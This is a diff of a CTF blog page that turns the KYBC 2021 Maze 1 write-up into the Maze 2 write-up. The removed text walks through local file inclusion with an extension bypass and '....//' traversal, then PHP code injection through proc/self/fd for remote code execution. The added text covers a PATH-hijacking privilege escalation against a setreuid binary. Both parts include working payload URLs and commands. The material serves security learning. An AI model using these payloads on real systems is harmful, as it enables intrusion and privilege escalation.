@@ -7,7 +7,7 @@
 
         <link rel="alternate"  href="https://railslide.io/feeds/all.atom.xml" type="application/atom+xml" title="Railslide Full Atom Feed"/>
 
-        <title>KYBC 2021 - Maze 1 Writeup // Railslide // Code, experiments, and thoughts</title>
+        <title>KYBC 2021 - Maze 2 Writeup // Railslide // Code, experiments, and thoughts</title>
 
 
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
@@ -52,9 +52,9 @@
         <div class="content">
             <section class="post">
                 <header class="post-header">
-                    <h1>KYBC 2021 - Maze 1 Writeup</h1>
+                    <h1>KYBC 2021 - Maze 2 Writeup</h1>
                         <p class="post-meta">
-                        category: <a href="https://railslide.io/category/ctf.html">CTF</a>, date: 17-03-2021
+                        category: <a href="https://railslide.io/category/ctf.html">CTF</a>, date: 22-03-2021
                         </p>
                         <p class="post-meta">
                             tags =                                 <a class="post-category" href="https://railslide.io/tag/ctf.html">ctf</a>
@@ -63,43 +63,30 @@
                                 <a class="post-category" href="https://railslide.io/tag/kybc.html">kybc</a>
                 </header>
             </section>
-            <p>The site is basically a search box that checks for matching txt files and then redirects to <code>http://5.150.254.85:8082/lookup.php?f=file.txt</code> to display the content of the file. <code>flag.txt</code> obviously leads to a fake flag, but the whole thing looks like a potential LFI.</p>
-<p>Trying to reach a file with an extension other than <code>.txt</code> results in an error. However, appending an extra <code>f</code> parameters after one with the <code>.txt</code> extension lets me bypass the extension check and access the content of the last file.</p>
-<p>The txt files are inside a <code>files/</code> folder and there seem to be some sort of sanitization mechanism, since <code>../</code> get stripped away. However, the filter applies only to that specific pattern, so <code>....//</code> becomes <code>../</code> after sanitation and allows me to look up into the parent folder.</p>
-<p>Combining the two bypasses together gets me the <code>etc/passwd</code> file:</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//etc/passwd`</span>
+            <p><em>In order to start this challenge it was necessary to complete the <a href="https://railslide.io/kybc-yogosha-2021-maze-1-writeups.html">Maze 1</a> first</em></p>
+<p>After catching the first flag, let's check what's in <code>home/ctf_user2</code>. There is a flag file, but this time concatenating it doesn't work since the current user (<code>ctf_user1</code>) doesn't have read permissions to it. The only other interesting thing is a file called <code>sysadmin.c</code>. Permissions are in my favor this time, so let's have a look at the content:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello sysadmin :) </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Today date : </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">getuid</span><span class="p">());</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&quot;date&quot;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 
-<p>The flag doesn't seem to be there though.</p>
-<p>Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.</p>
-<p>By examining the <code>proc/self/fd</code> folder I discover that <code>proc/self/fd/11</code> stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing <code>&lt;?php system('id'); ?&gt;</code></p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;submit=submit</span>
+<p>That <code>system("date")</code> call looks promising, so let's try to replace it with some useful bash statement instead:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;cat /home/ctf_user2/.52942ab6e8a6dd0bd75a9029c2b5c574_flag2.txt&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
 
 
-<p>and check the proc file again</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//proc/self/fd/11</span>
-</code></pre></div>
-
-
-<p>Yeah! The code gets executed and the result gets saved into it!!</p>
-<p>Let's run <code>ls /</code></p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;submit=submit</span>
-</code></pre></div>
-
-
-<p>No flag in the root folder, but <code>home/ctf_user1</code> seems interesting:</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;submit=submit</span>
-</code></pre></div>
-
-
-<p>there's the flag - let's cat it!</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;submit=submit</span>
-</code></pre></div>
-
-
-<p>Success! <code>FLAG_c4a66ead822b8d2dd42da826eb180371</code></p>
+<p>Check the proc file and catch the flag - success!</p>
             <a href="#" class="go-top">Go Top</a>
 <footer class="footer">
     <p>&copy; Railslide <a href="http://creativecommons.org/licenses/by-sa/4.0/">(CC BY-SA 4.0)</a> &ndash;
